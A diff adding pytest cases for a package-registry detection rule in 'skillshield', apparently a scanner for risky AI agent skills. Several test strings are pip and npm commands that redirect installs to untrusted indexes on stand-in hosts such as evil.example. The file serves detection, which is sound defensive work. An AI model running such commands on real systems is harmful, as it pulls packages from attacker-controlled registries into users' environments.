@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import sys
+import time
 from pathlib import Path
 
 import pytest
@@ -15,6 +16,7 @@ from skillshield.rules import (
     RULE_IDENTITY_HIJACK,
     RULE_LETHAL_TRIFECTA,
     RULE_OBFUSCATION,
+    RULE_PACKAGE_REGISTRY,
     RULE_PRIV_ESC,
     RULE_PROMPT_INJECTION,
     RULE_RUG_PULL,
@@ -255,6 +257,70 @@ class TestRugPullRule:
 
     def test_clean_passes(self):
         assert RULE_RUG_PULL.match(CLEAN_SKILL) == []
+
+
+class TestPackageRegistryRule:
+    def test_detects_pip_index_url(self):
+        assert (
+            RULE_PACKAGE_REGISTRY.match(
+                "pip install --index-url https://example.com/simple/ helper-tools"
+            )
+            != []
+        )
+
+    def test_detects_extra_index_url(self):
+        assert (
+            RULE_PACKAGE_REGISTRY.match(
+                "pip install --extra-index-url https://mirror.evil.test/simple pkg"
+            )
+            != []
+        )
+
+    def test_detects_pip_short_flag(self):
+        assert RULE_PACKAGE_REGISTRY.match("pip install -i https://evil.example/simple pkg") != []
+
+    def test_detects_pip_index_env(self):
+        assert (
+            RULE_PACKAGE_REGISTRY.match("PIP_INDEX_URL=https://evil.example/simple pip install pkg")
+            != []
+        )
+
+    def test_detects_npm_registry_config(self):
+        assert RULE_PACKAGE_REGISTRY.match("npm config set registry https://example.com/npm/") != []
+
+    def test_detects_npmrc_registry_line(self):
+        assert RULE_PACKAGE_REGISTRY.match("registry=https://evil.example/npm/") != []
+
+    def test_official_registry_passes(self):
+        assert (
+            RULE_PACKAGE_REGISTRY.match("pip install --index-url https://pypi.org/simple/ requests")
+            == []
+        )
+        assert (
+            RULE_PACKAGE_REGISTRY.match("npm config set registry https://registry.npmjs.org/") == []
+        )
+
+    def test_clean_install_passes(self):
+        assert RULE_PACKAGE_REGISTRY.match("pip install requests") == []
+
+    def test_short_flag_outside_pip_install_is_not_flagged(self):
+        assert RULE_PACKAGE_REGISTRY.match("curl -i https://api.example.com/health") == []
+        assert RULE_PACKAGE_REGISTRY.match("grep -i https://api.example.com/health") == []
+
+    def test_pip_install_short_flag_on_a_longer_line(self):
+        assert (
+            RULE_PACKAGE_REGISTRY.match("python -m pip install -i https://evil.example/simple pkg")
+            != []
+        )
+
+    def test_blank_lines_are_scanned_fast(self):
+        text = "\n" * 100_000
+        start = time.perf_counter()
+        assert RULE_PACKAGE_REGISTRY.match(text) == []
+        assert time.perf_counter() - start < 1.0
+
+    def test_clean_passes(self):
+        assert RULE_PACKAGE_REGISTRY.match(CLEAN_SKILL) == []
 
 
 class TestObfuscationRule:
